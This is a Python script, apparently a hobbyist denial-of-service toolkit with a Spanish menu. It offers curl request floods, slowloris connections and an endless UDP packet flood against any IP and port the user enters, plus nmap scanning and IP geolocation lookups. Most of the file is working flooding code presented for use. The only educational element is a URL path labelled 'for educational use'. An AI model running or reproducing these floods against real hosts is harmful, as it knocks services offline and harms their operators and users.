from os import system
import time
from colorama import Fore
import socket
import requests
import json
import random
Creator=Fore.BLUE+"74lg0"
Version=Fore.WHITE+"1.0"

def Nmap_banner():
    print(Fore.BLUE+"""
    █████████████████████████████
    █▄─▀█▄─▄█▄─▀█▀─▄██▀▄─██▄─▄▄─█
    ██─█▄▀─███─█▄█─███─▀─███─▄▄▄█
    ▀▄▄▄▀▀▄▄▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▀▀▀
    
    """)

def banner_udp_flood():
    print(Fore.RED+"██╗   ██╗██████╗ ██████╗"+Fore.WHITE+"     ██╗"+Fore.BLUE+" ████████╗ █████╗ ██████╗ ")
    print(Fore.RED+"██║   ██║██╔══██╗██╔══██╗"+Fore.WHITE+"   ██╔╝"+Fore.BLUE+" ╚══██╔══╝██╔══██╗██╔══██╗")
    print(Fore.RED+"██║   ██║██║  ██║██████╔╝"+Fore.WHITE+"  ██╔╝"+Fore.BLUE+"     ██║   ██║  ╚═╝██████╔╝")
    print(Fore.RED+"██║   ██║██║  ██║██╔═══╝"+Fore.WHITE+"  ██╔╝"+Fore.BLUE+"      ██║   ██║  ██╗██╔═══╝ ")
    print(Fore.RED+"╚██████╔╝██████╔╝██║"+Fore.WHITE+"     ██╔╝"+Fore.BLUE+"       ██║   ╚█████╔╝██║     ")
    print(Fore.RED+" ╚═════╝ ╚═════╝ ╚═╝"+Fore.WHITE+"     ╚═╝"+Fore.BLUE+"        ╚═╝    ╚════╝ ╚═╝     ")
   
sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(51200)
sock_socket=socket.socket(socket.AF_INET)



user_agents={
    
    "Opera/9.61.(X11; Linux x86_64; az-IN) Presto/2.9.190 Version/12.00"
    
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/5.0)"
    
    "Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; ht-HT) AppleWebKit/532.19.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6532.19.2"
    
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/535.0 (KHTML, like Gecko) FxiOS/17.3h5139.0 Mobile/16K097 Safari/535.0"
    
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows 98; Trident/5.1)"
}



system("clear")
print(Fore.BLUE+"░█████╗░░██████╗████████╗██████╗░░█████╗ "+Fore.RED+" ███╗░░██╗███████╗████████╗")
print(Fore.BLUE+"██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗"+Fore.RED+" ████╗░██║██╔════╝╚══██╔══╝")
print(Fore.BLUE+"███████║╚█████╗░░░░██║░░░██████╔╝██║░░██║"+Fore.RED+" ██╔██╗██║█████╗░░░░░██║░░░")
print(Fore.BLUE+"██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║"+Fore.RED+" ██║╚████║██╔══╝░░░░░██║░░░")
print(Fore.BLUE+"██║░░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝"+Fore.RED+" ██║░╚███║███████╗░░░██║░░░")
print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝ "+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")
print("~~~~~~~~~~~~~~~~~~~~~~~~~Created by:"+Creator+Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
print("~~~~~~~~~~~~~~~~~~~~~~~~~ Version: "+Version+Fore.RED+" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
print(Fore.WHITE+"\n---------------------- DoS-Denial of Service  -----------------------\n")
print(Fore.GREEN+"[1]"+Fore.WHITE+"Peticiones curl"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"UDP/TCP")
print("\n----------------------------- Ip tools  -----------------------------\n")
print(Fore.GREEN+"[5]"+Fore.WHITE+"Escaneo con Nmap"+Fore.GREEN+"\n[6]"+Fore.WHITE+"Mi ip"+Fore.GREEN+"\n[7]"+Fore.WHITE+"Informacion de mi dispositivo"+Fore.GREEN+"\n[8]"+Fore.WHITE+"Obtener Informacion de una IP"+Fore.GREEN+"\n[9]"+Fore.WHITE+"Informacion de los tipos de DoS")


method=input(Fore.WHITE+"~~~~"+Fore.GREEN+">"+Fore.WHITE+" ")

if method == "1":
    host=input("Ingresa el IP, Host\n~~~~> ")
    treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
    code_response=input("Codigo de respuesta https"+Fore.RED+" 404"+Fore.WHITE+"\nDeseas cambiar el codigo de respuesta"+Fore.GREEN+" y"+Fore.WHITE+"/"+Fore.RED+"n"+Fore.WHITE+"\n~~~~> ")
    if code_response == "y":
        actual_response=input("Ingresa una ruta valida para la pagina "+Fore.BLUE+"\nExample: "+Fore.WHITE+"Index.html"+"\n~~~~>")
        print("Iniciando solicitudes...")
        time.sleep(1)
        if treads == "":
            for i in range(500):
                system("curl -s -o /dev/null "+host+"/"+actual_response)
            print("solicitudes terminadas...")
        else:
            for i in range(int(treads)):
                system("curl -s -o /dev/null "+host+"/"+actual_response)
            print("solicitudes terminadas...")
            
    
    if code_response == "n":
        time.sleep(1)
        if treads == "":
            for i in range(500):
                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
            print("solicitudes terminadas...")
        else:
            print("Iniciando solicitudes...")
            time.sleep(1)
            for i in range(int(treads)):
                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
            print("solicitudes terminadas...")
                
                
elif method == "2":
    ip=input("Ingresa el IP, Host\n~~~~> ")
    port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~> ")
    HTTP_conexion=input("Ingresa la cantidad de conexiones\n~~~~> ")
    if HTTP_conexion == "":
        print("Elije la cantidad de conexiones y vuelve a intentarlo...")
        
    else:
        if port == "":
            print("Iniciando conexiones...")
            system("slowloris "+ip+" -s "+HTTP_conexion+" -p 80")
        
        else:
            print("Iniciando conexiones...")
            system("slowloris "+ip+" -s "+HTTP_conexion+" -p "+port)
            
            
elif method == "3":
    ip=input("Ingresa la IP\n~~~~> ")
    port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~>")
    if port == "":
        print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+"80")
        while True:
            sock.sendto(bytes, (ip,80))
    else:
        print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+port)
        while True:
            sock.sendto(bytes, (ip,int(port)))

elif method == "4":
    system("clear")
    
    banner_udp_flood()
    
    ip=input(Fore.WHITE+"Ingresa el IP, Host\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+"")
    port=int(input("Ingresa el puerto\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+""))
    time=int(input("Ingresa el numero de paquetes\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+""))
    if time == 1:
        for x in range(1):
            print(Fore.BLUE+"Enviando paquete #1"+" de "+str(time)+" paquetes"+Fore.YELLOW+" UDP "+Fore.WHITE+"a "+Fore.GREEN+ip+Fore.BLUE+" a treves del puerto "+Fore.YELLOW+str(port))
            sock.connect((ip,int(port)))
            sock.send(bytes)
            
    else:
        for x in range(time):
            number_package=x + 1
            print(Fore.BLUE+"Enviando paquete #"+str(number_package)+" de "+str(time)+" paquetes"+Fore.YELLOW+" UDP "+Fore.WHITE+"a "+Fore.GREEN+ip+Fore.BLUE+" a treves del puerto "+Fore.YELLOW+str(port)+Fore.GREEN+" [✓]")
            sock.connect((ip,int(port)))
            sock.send(bytes)
            if number_package == time:
                print("Exelente, todos los paquetes fueron enviados con exitos ;)")
        
elif method == "5":
    print("Escaneo con Nmap")
    time.sleep(2)
    system("clear")
    Nmap_banner()
    ip=input(Fore.WHITE+"Ingresa la direccion IPv4\n~~~~"+Fore.GREEN+">"+Fore.WHITE+" ")
    system("nmap -Pn "+ip)
            
            
            
elif method == "6":
    print("Tu direccion IP es:")
    time.sleep(1)
    system("curl ifconfig.me")
    
    
elif method == "7":
    print("Informacion de tu dispositivo...")
    time.sleep(1)
    system("curl ifconfig.me/all.json")
    
elif method == "8":
    api_url = "http://ip-api.com/json/"
    
    parametros ='status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
    
    data = {"fields":parametros}
    
    def ip_scraping(ip=""):
        
        res = requests.get(api_url+ip, data=data)
        
        api_json_res = json.loads(res.content)
        
        return api_json_res

    
    ip = input("Ingrese la dirección IP: ")
    
    par = parametros.split(",")
    for x in par:
        print("")
        print(x.upper(), ":"+str(ip_scraping(ip)[x]))
        print("")
        
        
elif method == "9":
    system("xdg-open index.html")
        
        
else:
    for i in range(100):
        time.sleep(0.002)
        print(Fore.YELLOW+"Opcion Invalida :)")
